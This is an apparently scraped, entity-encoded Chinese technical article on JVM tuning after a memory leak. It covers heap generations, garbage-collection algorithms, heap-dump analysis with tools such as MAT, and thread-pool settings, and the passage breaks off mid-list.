3CD;&#x8FC7;&#x6765;&#x8DDF;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x76F8;&#x6BD4;&#x541E;&#x5410;&#x91CF;&#x76F8;&#x5BF9;&#x8F83;&#x4F4E;&#x3002; &#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x52A8;&#x4F5C;&#x4F55;&#x65F6;&#x6267;&#x884C;&#xFF1F;Full GC&#x5F71;&#x54CD;&#x8F83;&#x5927;&#xFF0C;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x8FDB;&#x884C;Full GC &#x5F53;&#x5E74;&#x8F7B;&#x4EE3;&#x5185;&#x5B58;&#x6EE1;&#x65F6;&#xFF0C;&#x4F1A;&#x5F15;&#x53D1;&#x4E00;&#x6B21;&#x666E;&#x901A;GC&#xFF0C;&#x8BE5;GC&#x4EC5;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3002;&#x9700;&#x8981;&#x5F3A;&#x8C03;&#x7684;&#x65F6;&#xFF0C;&#x5E74;&#x8F7B;&#x4EE3;&#x6EE1;&#x662F;&#x6307;Eden&#x4EE3;&#x6EE1;&#xFF0C;Survivor&#x6EE1;&#x4E0D;&#x4F1A;&#x5F15;&#x53D1;GC &#x5F53;&#x5E74;&#x8001;&#x4EE3;&#x6EE1;&#x65F6;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;Full GC&#x5C06;&#x4F1A;&#x540C;&#x65F6;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3001;&#x5E74;&#x8001;&#x4EE3; &#x5F53;&#x6C38;&#x4E45;&#x4EE3;&#x6EE1;&#x65F6;&#x4E5F;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#x7684;&#x5378;&#x8F7D; &#x53E6;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x4F55;&#x65F6;&#x4F1A;&#x629B;&#x51FA;OutOfMemoryException&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x5185;&#x5B58;&#x88AB;&#x8017;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#x624D;&#x629B;&#x51FA; JVM98%&#x7684;&#x65F6;&#x95F4;&#x90FD;&#x82B1;&#x8D39;&#x5728;&#x5185;&#x5B58;&#x56DE;&#x6536; &#x6BCF;&#x6B21;&#x56DE;&#x6536;&#x7684;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;2% &#x6EE1;&#x8DB3;&#x8FD9;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x5C06;&#x89E6;&#x53D1;OutOfMemoryException&#xFF0C;&#x8FD9;&#x5C06;&#x4F1A;&#x7559;&#x7ED9;&#x7CFB;&#x7EDF;&#x4E00;&#x4E2A;&#x5FAE;&#x5C0F;&#x7684;&#x95F4;&#x9699;&#x4EE5;&#x505A;&#x4E00;&#x4E9B;Down&#x4E4B;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#x624B;&#x52A8;&#x6253;&#x5370;Heap Dump&#x3002;","keywords":null,"text":"&#x6700;&#x8FD1;&#x56E0;&#x9879;&#x76EE;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;&#x6545;&#x8FDB;&#x884C;&#x5927;&#x89C4;&#x6A21;&#x7684;JVM&#x6027;&#x80FD;&#x8C03;&#x4F18;&#xFF0C;&#x73B0;&#x628A;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x8FDB;&#x884C;&#x5F52;&#x7EB3;&#x603B;&#x7ED3; &#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;1.&#x5185;&#x5B58;&#x6A21;&#x578B;&#x6839;&#x636E;Java&#x865A;&#x62DF;&#x673A;&#x89C4;&#x8303;&#xFF0C;JVM&#x5C06;&#x5185;&#x5B58;&#x5212;&#x5206;&#x4E3A;&#xFF1A; &#x5E74;&#x8F7B;&#x4EE3;&#xFF08;New&#xFF09;&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;Java&#x5BF9;&#x8C61; &#x5E74;&#x8001;&#x4EE3;&#xFF08;Tenured)&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x56DE;&#x6536;&#x6389;&#x7684;&#x5BF9;&#x8C61;&#x5C06;&#x88AB;Copy&#x5230;&#x5E74;&#x8001;&#x4EE3; &#x6C38;&#x4E45;&#x4EE3;&#xFF08;Perm&#xFF09;&#xFF1A;&#x6C38;&#x4E45;&#x4EE3;&#x5B58;&#x653E;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x5927;&#x5C0F;&#x8DDF;&#x9879;&#x76EE;&#x7684;&#x89C4;&#x6A21;&#x3001;&#x7C7B;&#x3001;&#x65B9;&#x6CD5;&#x7684;&#x91CF;&#x6709;&#x5173;&#xFF0C;&#x4E00;&#x822C;&#x8BBE;&#x7F6E;&#x4E3A;128M&#x5C31;&#x8DB3;&#x591F;&#xFF0C;&#x8BBE;&#x7F6E;&#x539F;&#x5219;&#x662F;&#x9884;&#x7559;30%&#x7684;&#x7A7A;&#x95F4;&#x3002; &#x5176;&#x4E2D;New&#x548C;Tenured&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5806;&#x5185;&#x5B58;&#x4F1A;&#x4ECE;JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF08;-Xmx:3G&#xFF09;&#x6307;&#x5B9A;&#x7684;&#x5185;&#x5B58;&#x4E2D;&#x5206;&#x914D;&#x3002;Perm&#x4E0D;&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x6709;&#x865A;&#x62DF;&#x673A;&#x76F4;&#x63A5;&#x5206;&#x914D;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-XX:PermSize -XX:MaxPermSize &#x7B49;&#x53C2;&#x6570;&#x8C03;&#x6574;&#x5176;&#x5927;&#x5C0F;&#x3002; New&#x53C8;&#x5206;&#x4E3A;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#xFF1A; Eden&#xFF1A;Eden&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;&#x5BF9;&#x8C61; Survivor1 Survivro2&#xFF1A;&#x4E24;&#x4E2A;Survivor&#x7A7A;&#x95F4;&#x4E00;&#x6837;&#x5927;&#xFF0C;&#x5F53;Eden&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x88AB;&#x56DE;&#x6536;&#x6389;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x4E24;&#x4E2A;Survivor&#x4E4B;&#x95F4;&#x6765;&#x56DE;Copy&#xFF0C;&#x5F53;&#x6EE1;&#x8DB3;&#x67D0;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982;Copy&#x6B21;&#x6570;&#xFF0C;&#x5C31;&#x4F1A;&#x88AB;Copy&#x5230;Tenured&#x3002;&#x663E;&#x7136;&#xFF0C;Survivor&#x53EA;&#x662F;&#x589E;&#x52A0;&#x4E86;&#x5BF9;&#x8C61;&#x5728;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7684;&#x9017;&#x7559;&#x65F6;&#x95F4;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x88AB;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x3002; 2.&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E09;&#x7C7B;&#xFF0C;&#x90FD;&#x57FA;&#x4E8E;&#x6807;&#x8BB0;-&#x6E05;&#x9664;&#xFF08;&#x590D;&#x5236;&#xFF09;&#x7B97;&#x6CD5;&#xFF1A; Serial&#x7B97;&#x6CD5;&#xFF08;&#x5355;&#x7EBF;&#x7A0B;&#xFF09; &#x5E76;&#x884C;&#x7B97;&#x6CD5; &#x5E76;&#x53D1;&#x7B97;&#x6CD5; JVM&#x4F1A;&#x6839;&#x636E;&#x673A;&#x5668;&#x7684;&#x786C;&#x4EF6;&#x914D;&#x7F6E;&#x5BF9;&#x6BCF;&#x4E2A;&#x5185;&#x5B58;&#x4EE3;&#x9009;&#x62E9;&#x9002;&#x5408;&#x7684;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x673A;&#x5668;&#x591A;&#x4E8E;1&#x4E2A;&#x6838;&#xFF0C;&#x4F1A;&#x5BF9;&#x5E74;&#x8F7B;&#x4EE3;&#x9009;&#x62E9;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#xFF0C;&#x5173;&#x4E8E;&#x9009;&#x62E9;&#x7EC6;&#x8282;&#x8BF7;&#x53C2;&#x8003;JVM&#x8C03;&#x4F18;&#x6587;&#x6863;&#x3002; &#x7A0D;&#x5FAE;&#x89E3;&#x91CA;&#x4E0B;&#x7684;&#x662F;&#xFF0C;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x662F;&#x7528;&#x591A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;&#x5783;&#x573E;&#x56DE;&#x6536;&#xFF0C;&#x56DE;&#x6536;&#x671F;&#x95F4;&#x4F1A;&#x6682;&#x505C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#xFF0C;&#x4E5F;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x56DE;&#x6536;&#xFF0C;&#x4F46;&#x671F;&#x95F4;&#x4E0D;&#x505C;&#x6B62;&#x5E94;&#x7528;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x9002;&#x7528;&#x4E8E;&#x4EA4;&#x4E92;&#x6027;&#x9AD8;&#x7684;&#x4E00;&#x4E9B;&#x7A0B;&#x5E8F;&#x3002;&#x7ECF;&#x8FC7;&#x89C2;&#x5BDF;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x4F1A;&#x51CF;&#x5C11;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x8FD9;&#x53CD;&#x8FC7;&#x6765;&#x8DDF;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x76F8;&#x6BD4;&#x541E;&#x5410;&#x91CF;&#x76F8;&#x5BF9;&#x8F83;&#x4F4E;&#x3002; &#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x52A8;&#x4F5C;&#x4F55;&#x65F6;&#x6267;&#x884C;&#xFF1F;Full GC&#x5F71;&#x54CD;&#x8F83;&#x5927;&#xFF0C;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x8FDB;&#x884C;Full GC &#x5F53;&#x5E74;&#x8F7B;&#x4EE3;&#x5185;&#x5B58;&#x6EE1;&#x65F6;&#xFF0C;&#x4F1A;&#x5F15;&#x53D1;&#x4E00;&#x6B21;&#x666E;&#x901A;GC&#xFF0C;&#x8BE5;GC&#x4EC5;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3002;&#x9700;&#x8981;&#x5F3A;&#x8C03;&#x7684;&#x65F6;&#xFF0C;&#x5E74;&#x8F7B;&#x4EE3;&#x6EE1;&#x662F;&#x6307;Eden&#x4EE3;&#x6EE1;&#xFF0C;Survivor&#x6EE1;&#x4E0D;&#x4F1A;&#x5F15;&#x53D1;GC &#x5F53;&#x5E74;&#x8001;&#x4EE3;&#x6EE1;&#x65F6;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;Full GC&#x5C06;&#x4F1A;&#x540C;&#x65F6;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3001;&#x5E74;&#x8001;&#x4EE3; &#x5F53;&#x6C38;&#x4E45;&#x4EE3;&#x6EE1;&#x65F6;&#x4E5F;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#x7684;&#x5378;&#x8F7D; &#x53E6;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x4F55;&#x65F6;&#x4F1A;&#x629B;&#x51FA;OutOfMemoryException&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x5185;&#x5B58;&#x88AB;&#x8017;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#x624D;&#x629B;&#x51FA; JVM98%&#x7684;&#x65F6;&#x95F4;&#x90FD;&#x82B1;&#x8D39;&#x5728;&#x5185;&#x5B58;&#x56DE;&#x6536; &#x6BCF;&#x6B21;&#x56DE;&#x6536;&#x7684;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;2% &#x6EE1;&#x8DB3;&#x8FD9;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x5C06;&#x89E6;&#x53D1;OutOfMemoryException&#xFF0C;&#x8FD9;&#x5C06;&#x4F1A;&#x7559;&#x7ED9;&#x7CFB;&#x7EDF;&#x4E00;&#x4E2A;&#x5FAE;&#x5C0F;&#x7684;&#x95F4;&#x9699;&#x4EE5;&#x505A;&#x4E00;&#x4E9B;Down&#x4E4B;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#x624B;&#x52A8;&#x6253;&#x5370;Heap Dump&#x3002; &#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;1.&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A; &#x6BCF;&#x6B21;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x8D8A;&#x6765;&#x8D8A;&#x957F;&#xFF0C;&#x7531;&#x4E4B;&#x524D;&#x7684;10ms&#x5EF6;&#x957F;&#x5230;50ms&#x5DE6;&#x53F3;&#xFF0C;FullGC&#x7684;&#x65F6;&#x95F4;&#x4E5F;&#x6709;&#x4E4B;&#x524D;&#x7684;0.5s&#x5EF6;&#x957F;&#x5230;4&#x3001;5s FullGC&#x7684;&#x6B21;&#x6570;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x6700;&#x9891;&#x7E41;&#x65F6;&#x9694;&#x4E0D;&#x5230;1&#x5206;&#x949F;&#x5C31;&#x8FDB;&#x884C;&#x4E00;&#x6B21;FullGC &#x5E74;&#x8001;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#x5E76;&#x4E14;&#x6BCF;&#x6B21;FullGC&#x540E;&#x5E74;&#x8001;&#x4EE3;&#x6CA1;&#x6709;&#x5185;&#x5B58;&#x88AB;&#x91CA;&#x653E;&#x4E4B;&#x540E;&#x7CFB;&#x7EDF;&#x4F1A;&#x65E0;&#x6CD5;&#x54CD;&#x5E94;&#x65B0;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x9010;&#x6E10;&#x5230;&#x8FBE;OutOfMemoryError&#x7684;&#x4E34;&#x754C;&#x503C;&#x3002; 2.&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6; &#x901A;&#x8FC7;JMX&#x7684;MBean&#x751F;&#x6210;&#x5F53;&#x524D;&#x7684;Heap&#x4FE1;&#x606F;&#xFF0C;&#x5927;&#x5C0F;&#x4E3A;&#x4E00;&#x4E2A;3G&#xFF08;&#x6574;&#x4E2A;&#x5806;&#x7684;&#x5927;&#x5C0F;&#xFF09;&#x7684;hprof&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x542F;&#x52A8;JMX&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Java&#x7684;jmap&#x547D;&#x4EE4;&#x6765;&#x751F;&#x6210;&#x8BE5;&#x6587;&#x4EF6;&#x3002; 3.&#x5206;&#x6790;dump&#x6587;&#x4EF6;&#x4E0B;&#x9762;&#x8981;&#x8003;&#x8651;&#x7684;&#x662F;&#x5982;&#x4F55;&#x6253;&#x5F00;&#x8FD9;&#x4E2A;3G&#x7684;&#x5806;&#x4FE1;&#x606F;&#x6587;&#x4EF6;&#xFF0C;&#x663E;&#x7136;&#x4E00;&#x822C;&#x7684;Window&#x7CFB;&#x7EDF;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x5927;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x5FC5;&#x987B;&#x501F;&#x52A9;&#x9AD8;&#x914D;&#x7F6E;&#x7684;Linux&#x3002;&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x501F;&#x52A9;X-Window&#x628A;Linux&#x4E0A;&#x7684;&#x56FE;&#x5F62;&#x5BFC;&#x5165;&#x5230;Window&#x3002;&#x6211;&#x4EEC;&#x8003;&#x8651;&#x7528;&#x4E0B;&#x9762;&#x51E0;&#x79CD;&#x5DE5;&#x5177;&#x6253;&#x5F00;&#x8BE5;&#x6587;&#x4EF6;&#xFF1A; Visual VM IBM HeapAnalyzer JDK &#x81EA;&#x5E26;&#x7684;Hprof&#x5DE5;&#x5177; &#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x65F6;&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x52A0;&#x8F7D;&#x901F;&#x5EA6;&#xFF0C;&#x5EFA;&#x8BAE;&#x8BBE;&#x7F6E;&#x6700;&#x5927;&#x5185;&#x5B58;&#x4E3A;6G&#x3002;&#x4F7F;&#x7528;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x90FD;&#x65E0;&#x6CD5;&#x76F4;&#x89C2;&#x5730;&#x89C2;&#x5BDF;&#x5230;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;Visual VM&#x867D;&#x80FD;&#x89C2;&#x5BDF;&#x5230;&#x5BF9;&#x8C61;&#x5927;&#x5C0F;&#xFF0C;&#x4F46;&#x770B;&#x4E0D;&#x5230;&#x8C03;&#x7528;&#x5806;&#x6808;&#xFF1B;HeapAnalyzer&#x867D;&#x7136;&#x80FD;&#x770B;&#x5230;&#x8C03;&#x7528;&#x5806;&#x6808;&#xFF0C;&#x5374;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x6253;&#x5F00;&#x4E00;&#x4E2A;3G&#x7684;&#x6587;&#x4EF6;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x53C8;&#x9009;&#x7528;&#x4E86;Eclipse&#x4E13;&#x95E8;&#x7684;&#x9759;&#x6001;&#x5185;&#x5B58;&#x5206;&#x6790;&#x5DE5;&#x5177;Mat 4.&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x901A;&#x8FC7;Mat&#x6211;&#x4EEC;&#x80FD;&#x6E05;&#x695A;&#x5730;&#x770B;&#x5230;&#xFF0C;&#x54EA;&#x4E9B;&#x5BF9;&#x8C61;&#x88AB;&#x6000;&#x7591;&#x4E3A;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;&#x54EA;&#x4E9B;&#x5BF9;&#x8C61;&#x5360;&#x7684;&#x7A7A;&#x95F4;&#x6700;&#x5927;&#x53CA;&#x5BF9;&#x8C61;&#x7684;&#x8C03;&#x7528;&#x5173;&#x7CFB;&#x3002;&#x9488;&#x5BF9;&#x672C;&#x6848;&#xFF0C;&#x5728;ThreadLocal&#x4E2D;&#x6709;&#x5F88;&#x591A;&#x7684;JbpmContext&#x5B9E;&#x4F8B;&#xFF0C;&#x7ECF;&#x8FC7;&#x8C03;&#x67E5;&#x662F;JBPM&#x7684;Context&#x6CA1;&#x6709;&#x5173;&#x95ED;&#x6240;&#x81F4; &#x53E6;&#x5916;&#xFF0C;&#x901A;&#x8FC7;Mat&#x6216;JMX&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x5206;&#x6790;&#x7EBF;&#x7A0B;&#x72B6;&#x6001;&#xFF0C;&#x53EF;&#x4EE5;&#x89C2;&#x5BDF;&#x5230;&#x7EBF;&#x7A0B;&#x88AB;&#x963B;&#x585E;&#x5728;&#x54EA;&#x4E2A;&#x5BF9;&#x8C61;&#x4E0A;&#xFF0C;&#x4ECE;&#x800C;&#x5224;&#x65AD;&#x7CFB;&#x7EDF;&#x7684;&#x74F6;&#x9888;&#x3002; 5.&#x56DE;&#x5F52;&#x95EE;&#x9898; Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x5D29;&#x6E83;&#x524D;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x8D8A;&#x6765;&#x8D8A;&#x957F;&#xFF1F;A:&#x6839;&#x636E;&#x5185;&#x5B58;&#x6A21;&#x578B;&#x548C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x5206;&#x4E24;&#x90E8;&#x5206;&#xFF1A;&#x5185;&#x5B58;&#x6807;&#x8BB0;&#x3001;&#x6E05;&#x9664;&#xFF08;&#x590D;&#x5236;&#xFF09;&#xFF0C;&#x6807;&#x8BB0;&#x90E8;&#x5206;&#x53EA;&#x8981;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x56FA;&#x5B9A;&#x65F6;&#x95F4;&#x662F;&#x4E0D;&#x53D8;&#x7684;&#xFF0C;&#x53D8;&#x7684;&#x662F;&#x590D;&#x5236;&#x90E8;&#x5206;&#xFF0C;&#x56E0;&#x4E3A;&#x6BCF;&#x6B21;&#x5783;&#x573E;&#x56DE;&#x6536;&#x90FD;&#x6709;&#x4E00;&#x4E9B;&#x56DE;&#x6536;&#x4E0D;&#x6389;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x6240;&#x4EE5;&#x589E;&#x52A0;&#x4E86;&#x590D;&#x5236;&#x91CF;&#xFF0C;&#x5BFC;&#x81F4;&#x65F6;&#x95F4;&#x5EF6;&#x957F;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5224;&#x65AD;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x7684;&#x4F9D;&#x636E;Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;Full GC&#x7684;&#x6B21;&#x6570;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF1F;A&#xFF1A;&#x56E0;&#x6B64;&#x5185;&#x5B58;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x9010;&#x6E10;&#x8017;&#x5C3D;&#x4E86;&#x5E74;&#x8001;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x5BFC;&#x81F4;&#x65B0;&#x5BF9;&#x8C61;&#x5206;&#x914D;&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x9891;&#x7E41;&#x7684;&#x5783;&#x573E;&#x56DE;&#x6536;Q:&#x4E3A;&#x4EC0;&#x4E48;&#x5E74;&#x8001;&#x4EE3;&#x5360;&#x7528;&#x7684;&#x5185;&#x5B58;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF1F;A:&#x56E0;&#x4E3A;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x65E0;&#x6CD5;&#x88AB;&#x56DE;&#x6536;&#xFF0C;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x5730;&#x88AB;Copy&#x5230;&#x5E74;&#x8001;&#x4EE3; &#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;&#x9664;&#x4E86;&#x4E0A;&#x8FF0;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x5916;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53D1;&#x73B0;CPU&#x957F;&#x671F;&#x4E0D;&#x8DB3;3%&#xFF0C;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x91CF;&#x4E0D;&#x591F;&#xFF0C;&#x9488;&#x5BF9;8core&#xD7;16G&#x3001;64bit&#x7684;Linux&#x670D;&#x52A1;&#x5668;&#x6765;&#x8BF4;&#xFF0C;&#x662F;&#x4E25;&#x91CD;&#x7684;&#x8D44;&#x6E90;&#x6D6A;&#x8D39;&#x3002;&#x5728;CPU&#x8D1F;&#x8F7D;&#x4E0D;&#x8DB3;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5076;&#x5C14;&#x4F1A;&#x6709;&#x7528;&#x6237;&#x53CD;&#x6620;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x95F4;&#x8FC7;&#x957F;&#xFF0C;&#x6211;&#x4EEC;&#x610F;&#x8BC6;&#x5230;&#x5FC5;&#x987B;&#x5BF9;&#x7A0B;&#x5E8F;&#x53CA;JVM&#x8FDB;&#x884C;&#x8C03;&#x4F18;&#x3002;&#x4ECE;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;&#x8FDB;&#x884C;&#xFF1A; &#x7EBF;&#x7A0B;&#x6C60;&#xFF1A;&#x89E3;&#x51B3;&#x7528;&#x6237;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x957F;&#x7684;&#x95EE;&#x9898; &#x8FDE;&#x63A5;&#x6C60; JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF1A;&#x8C03;&#x6574;&#x5404;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x6BD4;&#x4F8B;&#x548C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF; &#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#xFF1A;&#x6539;&#x8FDB;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x7B97;&#x6CD5;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3001; 1.Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java.util.concurrent.ThreadPoolExecutor&#xFF09;&#x5927;&#x591A;&#x6570;JVM6&#x4E0A;&#x7684;&#x5E94;&#x7528;&#x91C7;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x90FD;&#x662F;JDK&#x81EA;&#x5E26;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x4E4B;&#x6240;&#x4EE5;&#x628A;&#x6210;&#x719F;&#x7684;Java&#x7EBF;&#x7A0B;&#x6C60;&#x8FDB;&#x884C;&#x7F57;&#x55E6;&#x8BF4;&#x660E;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x8BE5;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x884C;&#x4E3A;&#x4E0E;&#x6211;&#x4EEC;&#x60F3;&#x8C61;&#x7684;&#x6709;&#x70B9;&#x51FA;&#x5165;&#x3002;Java&#x7EBF;&#x7A0B;&#x6C60;&#x6709;&#x51E0;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#xFF1A; corePoolSize&#xFF1A;&#x6838;&#x5FC3;&#x7EBF;&#x7A0B;&#x6570;&#xFF08;&#x6700;&#x65B0;&#x7EBF;&#x7A0B;&#x6570;&#xFF09; maximumPoolSize&#xFF1A;&#x6700;&#x5927;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x6570;&#x91CF;&#x7684;&#x4EFB;&#x52A1;&#x4F1A;&#x88AB;&#x62D2;&#x7EDD;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;RejectedExecutionHandler&#x63A5;&#x53E3;&#x81EA;&#x5B9A;&#x4E49;&#x5904;&#x7406;&#x65B9;&#x5F0F; 